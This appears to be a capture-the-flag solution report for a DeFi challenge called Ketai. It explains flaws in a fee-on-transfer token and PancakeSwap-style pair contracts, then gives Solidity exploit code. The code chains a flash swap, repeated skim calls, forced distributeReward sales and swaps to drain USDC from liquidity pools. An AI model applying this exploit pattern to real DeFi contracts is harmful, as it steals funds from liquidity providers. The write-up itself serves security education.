# Ketai - Solution Report

## Problem Overview

### Contract Summary

The Ketai challenge involves a DeFi ecosystem with the following main components:

1. Ketai (KT) Token: An ERC20 token with custom transfer logic and reward distribution mechanism.
2. USDT and USDC: Simulated stablecoin tokens.
3. PancakeSwap: A decentralized exchange (DEX) implementation including Factory, Router, and Pair contracts.
4. Challenge Contract: Sets up the initial state and defines the winning condition.

Key functionalities:

- Ketai token implements a 30% trade fee on buys and sells.
- Ketai has a `distributeReward` function that sells collected fees and distributes USDT to LP providers.
- PancakeSwap contracts allow for token swaps and liquidity provision.

### Initial Setup

The challenge sets up the following initial state:

- Creates Ketai/USDT and Ketai/USDC liquidity pairs.
- Adds 5,000,000 Ketai and 10,000,000 USDT/USDC to each pair.
- Sets up trading info for Ketai token.

### Success Criteria

To solve the challenge, the attacker must:

- Transfer at least 9,999,999 USDC to the address 0xf2331a2d (randomFolks).

The goal is to exploit vulnerabilities in the contracts to drain a significant amount of USDC from the liquidity pool and transfer it to the target address.

## Vulnerability

The Ketai challenge contains multiple vulnerabilities that can be exploited to drain funds from the liquidity pools. The main vulnerabilities are:

1. Flash loan vulnerability in PancakePair's `swap` function:
   The `swap` function in PancakePair.sol (lines 159-187) allows for a callback to the receiver before finalizing the swap:

   ```solidity
   if (data.length > 0) IPancakeCallee(to).pancakeCall(msg.sender, amount0Out, amount1Out, data);
   ```

   While protected by the `lock` modifier against reentrancy, this callback still allows the receiver to perform complex operations, including additional swaps and manipulations, before the initial swap is completed. This can be exploited for flash loan attacks and price manipulation.

2. Incorrect balance tracking in Ketai's `_transfer` function:
   The `_transfer` function in Ketai.sol (lines 33-50) incorrectly updates balances when transferring to or from the pair address:

   ```solidity
   if (from == address(pair) || to == address(pair)) {
       uint256 fee = amount * tradeFee / 100;
       _balances[from] -= amount;
       _balances[to] += amount - fee;
       _balances[address(this)] += fee * lpProviders.length;
   }
   ```

   This implementation allows for balance inflation when repeatedly transferring tokens to and from the pair address.

3. Vulnerability in PancakePair's `skim` function:
   The `skim` function in PancakePair.sol (lines 189-194) allows anyone to transfer excess tokens from the pair to any address:

   ```solidity
   function skim(address to) external lock {
       address _token0 = token0; // gas savings
       address _token1 = token1; // gas savings
       _safeTransfer(_token0, to, IERC20(_token0).balanceOf(address(this)).sub(reserve0));
       _safeTransfer(_token1, to, IERC20(_token1).balanceOf(address(this)).sub(reserve1));
   }
   ```

   This function can be exploited in combination with the balance inflation vulnerability to extract tokens from the pair.

4. Unprotected `distributeReward` function in Ketai:
   The `distributeReward` function in Ketai.sol (lines 65-73) can be called by anyone:

   ```solidity
   function distributeReward() public {
       uint256 rewardToken = balanceOf(address(this));
       for (uint256 i = 0; i < lpProviders.length; i++) {
           sellToUSDT(rewardToken / lpProviders.length, owner());
       }
   }
   ```

   This allows an attacker to force the contract to sell its tokens, potentially at manipulated prices.

These vulnerabilities, when combined, allow an attacker to manipulate token balances, exploit price discrepancies, and drain funds from the liquidity pools.

## Attack Process

The attack exploits the vulnerabilities in the Ketai and PancakeSwap contracts through a series of steps:

1. Flash Loan Initiation:

   - Borrow a large amount of Ketai tokens (4,900,000) from the Ketai-USDC pair using the `swap` function.
   - This triggers the `pancakeCall` function in our exploit contract.

2. Price Manipulation Loop:

   - Inside `pancakeCall`, perform the following steps 25 times:
     - Transfer 10% of the Ketai balance to the Ketai-USDT pair.
     - Exploit the `skim` function vulnerability:
       - Call `skim` on the Ketai-USDT pair 200 times.
         This repeatedly triggers the Ketai token's transfer function, causing fees to accumulate in the Ketai contract due to the flawed fee mechanism.
     - Call `skim` once more to transfer the small residual of Ketai tokens (difference between pair balance and reserve) to the exploit contract.
     - Swap 90% of the Ketai tokens for USDT.
     - Call `distributeReward` on the Ketai contract multiple times.
       - This forces the contract to sell its accumulated Ketai tokens (from fees) for USDT at manipulated prices.
     - Swap the received USDT back to Ketai.

3. Flash Loan Repayment:

   - After the loop, repay the flash loan with a 12.5% fee.

4. Final Token Swap:

   - Swap the remaining Ketai tokens for USDC.

5. Transfer to Target:
   - Send all the acquired USDC to the `randomFolks` address (0xf2331a2d).

This attack process exploits the balance inflation bug in the Ketai contract, the vulnerable `skim` function in the PancakePair contract, and the unprotected `distributeReward` function in the Ketai contract. By repeatedly manipulating the token balances and forcing reward distributions at advantageous moments, the attacker can drain a significant amount of value from the liquidity pools.

The combination of these steps allows the attacker to exponentially increase their token holdings, ultimately acquiring enough USDC to meet the challenge's success criteria.

## Proof of Concept (PoC)

The core of the exploit is implemented in the `Exploit` contract. Here are the key parts of the implementation:

1. Flash Loan Initiation:

```solidity
function exploit() external {
    uint256 amount0 = 0;
    uint256 amount1 = 0;
    if (challenge.ketaiUSDCPair().token0() == address(challenge.ketai())) {
        amount0 = FLASH_LOAN_AMOUNT;
    } else {
        amount1 = FLASH_LOAN_AMOUNT;
    }
    challenge.ketaiUSDCPair().swap(amount0, amount1, address(this), "123");

    // ... (rest of the function)
}
```

2. Flash Loan Callback and Price Manipulation Loop:

```solidity
function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
    require(msg.sender == address(challenge.ketaiUSDCPair()), "Unauthorized callback");

    for (uint256 c = 0; c < 25; c++) {
        uint256 ketaiBalance = challenge.ketai().balanceOf(address(this));

        // Transfer 10% of Ketai to USDT pair
        challenge.ketai().transfer(address(challenge.ketaiUSDTPair()), ketaiBalance / 10);

        // Exploit skim function to accumulate fees in Ketai contract
        for (uint256 i = 0; i < 200; i++) {
            challenge.ketaiUSDTPair().skim(address(challenge.ketaiUSDTPair()));
        }
        challenge.ketaiUSDTPair().skim(address(this));

        // Swap 90% of Ketai for USDT
        swapKetaiForUSDT(ketaiBalance * 9 / 10);

        uint256 usdtBalance = challenge.usdt().balanceOf(address(this));

        // Exploit distributeReward function
        for (uint256 i = 0; i < 100 / (c + 1); i++) {
            challenge.ketai().distributeReward();
        }

        // Swap USDT back to Ketai
        swapUSDTForKetai(usdtBalance);
    }

    // Repay flash loan with fee
    uint256 repaymentAmount = FLASH_LOAN_AMOUNT * REPAYMENT_FACTOR / REPAYMENT_DIVISOR;
    require(challenge.ketai().balanceOf(address(this)) >= repaymentAmount, "Insufficient Ketai for repayment");
    challenge.ketai().transfer(address(challenge.ketaiUSDCPair()), repaymentAmount);
}
```

3. Token Swapping Helper Functions:

```solidity
function swapKetaiForUSDT(uint256 amount) internal {
    challenge.ketai().approve(address(challenge.router()), type(uint256).max);
    address[] memory path = new address[](2);
    path[0] = address(challenge.ketai());
    path[1] = address(challenge.usdt());
    challenge.router().swapExactTokensForTokensSupportingFeeOnTransferTokens(
        amount, 0, path, address(this), block.timestamp
    );
}

function swapUSDTForKetai(uint256 amount) internal {
    challenge.usdt().approve(address(challenge.router()), type(uint256).max);
    address[] memory path = new address[](2);
    path[0] = address(challenge.usdt());
    path[1] = address(challenge.ketai());
    challenge.router().swapExactTokensForTokensSupportingFeeOnTransferTokens(
        amount, 0, path, address(this), block.timestamp
    );
}

function swapKetaiForUSDC(uint256 amount) internal {
    challenge.ketai().approve(address(challenge.router()), type(uint256).max);
    address[] memory path = new address[](2);
    path[0] = address(challenge.ketai());
    path[1] = address(challenge.usdc());
    challenge.router().swapExactTokensForTokensSupportingFeeOnTransferTokens(
        amount, 0, path, address(this), block.timestamp
    );
}
```

This implementation exploits the vulnerabilities in the Ketai and PancakeSwap contracts to manipulate token balances and drain funds from the liquidity pools.
